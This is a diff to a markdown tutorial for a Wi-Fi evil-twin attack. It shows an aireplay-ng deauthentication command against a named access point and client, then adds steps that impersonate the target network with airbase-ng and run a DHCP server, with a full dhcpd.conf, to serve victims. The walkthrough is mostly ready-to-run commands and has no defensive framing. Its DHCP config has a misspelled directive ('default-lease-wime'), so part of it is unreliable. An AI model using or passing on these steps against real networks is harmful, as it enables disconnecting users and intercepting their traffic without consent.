@@ -67,5 +67,44 @@ aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
 
 -c : the client that connect to AP legally. if not spcecif which client , it will disconnect all the clients which connect to this WI-FI
 
+## 4. Set up a fake AP impersonating the target AP
 
+```
+airbase-ng -a AA:AA:AA:AA:AA:AA --essid 'BeautifulSoup' -c 11 wlan0mon
+```
+
+-a :set up MAC address 
+
+-essid : the name of AP ,this should be same as the target WI-FI
+
+-c : channel 11
+
+###  DHCP server 
+
+1. install DHCP server
+
+```
+sudo apt install -y isc-dhcp-server
+```
+2.modify DHCP conf file
+
+type the command below in your terminal
+
+```
+vi /etc/dhcp/dhcpd.conf
+```
+change the content or uncomment the content as follow
+
+```
+authoritative;
+default-lease-wime 600;
+max-lease-time 7200;
+subnet 192.168.1.128 netmask 255.255.255.128 {
+option subnet-mask 255.255.255.128;
+option broadcast 192.168.1.255;
+option routers 192.168.1.129;
+option domain-name-servers 8.8.8.8;
+range 192.168.1.130 192.168.1.140;
+}
+```
 
